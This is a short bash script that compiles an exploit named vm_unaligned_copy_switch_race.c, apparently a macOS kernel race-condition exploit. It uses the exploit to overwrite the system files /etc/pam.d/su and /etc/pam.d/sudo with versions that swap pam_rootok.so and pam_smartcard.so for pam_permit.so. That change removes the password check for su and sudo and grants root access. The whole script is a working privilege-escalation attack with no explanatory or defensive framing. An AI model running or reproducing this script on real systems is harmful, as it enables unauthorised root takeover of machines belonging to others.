#!/bin/bash

mkdir files 2>/dev/null

# Compile exploit
clang -o mdc_overwrite vm_unaligned_copy_switch_race.c

# Modify pam.d sudo and su files
cat /etc/pam.d/su > files/su_perms_original.txt
cat /etc/pam.d/sudo > files/sudo_perms_original.txt
sed -e 's/pam_rootok.so/pam_permit.so/g' files/su_perms_original.txt > files/su_perms_modified.txt
sed -e 's/pam_smartcard.so/pam_permit.so   /g' files/sudo_perms_original.txt > files/sudo_perms_modified.txt

# Run exploit and overwrite sudo and su files
./mdc_overwrite /etc/pam.d/su files/su_perms_modified.txt
./mdc_overwrite /etc/pam.d/sudo files/sudo_perms_modified.txt